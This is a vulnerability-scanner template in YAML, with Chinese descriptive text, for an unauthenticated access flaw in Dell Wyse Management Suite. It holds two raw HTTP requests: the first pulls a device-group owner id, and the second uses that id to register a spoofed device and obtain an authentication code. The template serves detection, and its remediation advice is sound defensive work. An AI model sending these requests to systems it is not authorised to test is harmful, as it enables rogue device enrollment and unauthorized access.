id: wyse-devicegroup-register

info:
  name: Dell Wyse Management Suite - 未授权访问漏洞
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于检测 Dell Wyse Management Suite - 未授权访问漏洞。该类问题通常源于服务配置过宽、调试能力暴露或安全控制未按生产环境要求启用。模板会向 `/ccm-web/open/deviceGroupLogin2`、`/ccm-web/open/deviceRegister` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可能借助错误配置访问内部功能、敏感数据或原本不应公开的管理能力。
    - 配置缺陷常与其他漏洞组合使用，扩大暴露面并增加被定向攻击的概率。
  remediation: |
    - 按最小暴露原则收敛相关服务配置，关闭调试、示例、未使用插件和不必要接口。
    - 为管理入口和敏感接口增加认证、授权、来源限制和审计记录。
    - 复核生产环境基线，确认安全头、访问控制、默认配置和网络边界符合要求。
  reference:
    - https://swarm.ptsecurity.com/business-logic-and-chains-unauthenticated-rce-in-dell-wyse-management-suite/
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"/ccm-web/"
  tags: dell,wyse,auth-bypass,misconfig

flow: http(1) && http (2)

http:
  - raw:
      - |
        POST /ccm-web/open/deviceGroupLogin2 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: RMA
        Content-Type: application/json; charset=UTF-8

        {}

    extractors:
      - type: regex
        name: owner_id
        part: body
        group: 1
        regex:
          - '"id":([0-9]+)'
        internal: true

    matchers:
      - type: word
        part: body
        words:
          - '"isActive":true'
        internal: true

  - raw:
      - |
        POST /ccm-web/open/deviceRegister HTTP/1.1
        Host: {{Hostname}}
        User-Agent: RMA
        Content-Type: application/json; charset=UTF-8
        X-Stratus-device-owner-id: {{owner_id}}

        {"deviceType":{"type":81},"owner":{"id":{{owner_id}}},"macAddress":"ff:ff:ff:ff:ff:ff"}

    matchers:
      - type: word
        part: body
        words:
          - '"authenticationCode":'
          - '"wyseIdentifier"'
        condition: and
